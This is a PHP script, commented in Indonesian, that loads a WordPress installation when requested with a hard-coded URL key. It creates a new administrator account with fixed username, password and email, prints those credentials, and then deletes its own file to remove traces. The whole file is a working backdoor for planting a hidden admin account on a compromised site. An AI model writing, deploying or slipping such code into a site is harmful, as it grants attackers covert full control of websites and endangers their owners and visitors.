<?php
// ===== DEBUG =====
ini_set('display_errors', 1);
error_reporting(E_ALL);

// ===== SECURITY KEY =====
$ACCESS_KEY = 'KeyBapakseo-Doyok';

// Validasi akses (opsional, bisa dihapus kalau mau langsung jalan tanpa URL)
if (!isset($_GET['key']) || $_GET['key'] !== $ACCESS_KEY) {
    die('Akses ditolak!');
}

// ===== LOAD WORDPRESS =====
$wp_load = __DIR__ . '/wp-load.php';

if (!file_exists($wp_load)) {
    $wp_load = dirname(__DIR__) . '/wp-load.php';
}

if (!file_exists($wp_load)) {
    die('wp-load.php tidak ditemukan');
}

require_once($wp_load);

// ===== DATA USER =====
$username = 'Admin';
$password = 'Doyok-King-udud535343!@@';
$email    = 'becakdorong84@gmail.com';

// ===== VALIDASI =====
if (empty($username) || empty($password) || empty($email)) {
    die('ERROR: Data tidak lengkap');
}

if (!is_email($email)) {
    die('ERROR: Format email tidak valid');
}

if (username_exists($username)) {
    die('ERROR: Username sudah digunakan');
}

if (email_exists($email)) {
    die('ERROR: Email sudah digunakan');
}

// ===== BUAT USER =====
$user_id = wp_create_user($username, $password, $email);

if (is_wp_error($user_id)) {
    die('ERROR: ' . $user_id->get_error_message());
}

// ===== SET ADMIN =====
$user = new WP_User($user_id);
$user->set_role('administrator');

// ===== OUTPUT =====
echo "<h2>✅ ADMIN BERHASIL DIBUAT</h2>";
echo "User ID: $user_id<br>";
echo "Username: $username<br>";
echo "Password: $password<br>";
echo "Email: $email<br>";

// ===== AUTO DELETE =====
unlink(__FILE__);
?>
